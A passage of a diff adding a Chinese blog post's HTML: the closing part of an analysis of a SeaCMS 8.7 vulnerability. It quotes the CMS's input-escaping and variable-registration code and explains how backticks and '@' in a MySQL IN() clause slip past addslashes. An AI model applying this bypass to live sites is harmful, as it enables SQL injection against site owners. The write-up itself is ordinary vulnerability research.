+		{
+			<span style="color:#66d9ef">foreach</span>($svar <span style="color:#66d9ef">as</span> $_k <span style="color:#f92672">=&gt;</span> $_v) $svar[$_k] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_RunMagicQuotes</span>($_v);
+		}
+		<span style="color:#66d9ef">else</span>
+		{
+			$svar <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($svar);
+		}
+	}
+	<span style="color:#66d9ef">return</span> $svar;
+}
+</code></pre></div><p><strong>为什么要加上``两个反引号和@?</strong></p>
+<p>因<code>in</code>在MySQL里面用法是：</p>
+<p><code>select * from where field in (value1,value2,value3,…)</code></p>
+<p>value1必须是一个值，整数型或者文本型都可以，如果用单引号的话就会变成三个转义<code>\'\'\'</code></p>
+<p>`在MySQL上面是作为一个转义符号来使用，一般为了不让和系统的变量冲突所以使用，一般在<strong>数据库名、表名、字段名</strong>使用，所以这里用@来使这个成为一个变量类型。</p>
+<h1 id="0x04-后记">0x04 后记</h1>
+<p>在6.53的版本中<code>include/common.php</code>中的44-47行接收到变量</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">foreach</span>(<span style="color:#66d9ef">Array</span>(<span style="color:#e6db74">&#39;_GET&#39;</span>,<span style="color:#e6db74">&#39;_POST&#39;</span>,<span style="color:#e6db74">&#39;_COOKIE&#39;</span>) <span style="color:#66d9ef">as</span> $_request)
+{
+	<span style="color:#66d9ef">foreach</span>($$_request <span style="color:#66d9ef">as</span> $_k <span style="color:#f92672">=&gt;</span> $_v) ${$_k} <span style="color:#f92672">=</span> <span style="color:#a6e22e">_RunMagicQuotes</span>($_v);
+}
+</code></pre></div><p>但是在75行这里又重新赋值了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">require_once</span>(<span style="color:#a6e22e">sea_DATA</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/config.cache.inc.php&#34;</span>);
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/7.png" alt=""></p>
+<p>不懂8.9的版本是否是这样，在官网拿不到8.9的源码。</p>
+<h1 id="0x05-参考">0x05 参考</h1>
+<p><a href="https://www.cnblogs.com/shijianchuzhenzhi/p/6193097.html">https://www.cnblogs.com/shijianchuzhenzhi/p/6193097.html</a></p>
+<p><a href="https://www.t00ls.net/thread-49691-1-1.html">https://www.t00ls.net/thread-49691-1-1.html</a></p>
+<p><a href="https://nosec.org/home/detail/2222.html">https://nosec.org/home/detail/2222.html</a></p>
+<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>
+<p><a href="https://www.cnblogs.com/Lcy-Sun0419/p/7843912.html">https://www.cnblogs.com/Lcy-Sun0419/p/7843912.html</a></p>
+</div>
+<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">
+
+
+
+
+
+
+
+
+
+
+<div class="toc">
+
+    <div class="page-header"><strong>目录</strong></div>
+
+    <div id="page-scrollspy" class="toc-nav">
+
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
+                            0x01 前言
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x02-%e7%8e%af%e5%a2%83">
+                            0x02 环境
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e8%af%a6%e6%83%85">
+                            0x03 漏洞详情
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">
+                            漏洞复现
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
+                            漏洞分析
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x04-%e5%90%8e%e8%ae%b0">
+                            0x04 后记
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x05-%e5%8f%82%e8%80%83">
+                            0x05 参考
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+
+    </div>
+
+</div>
+
+
+
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
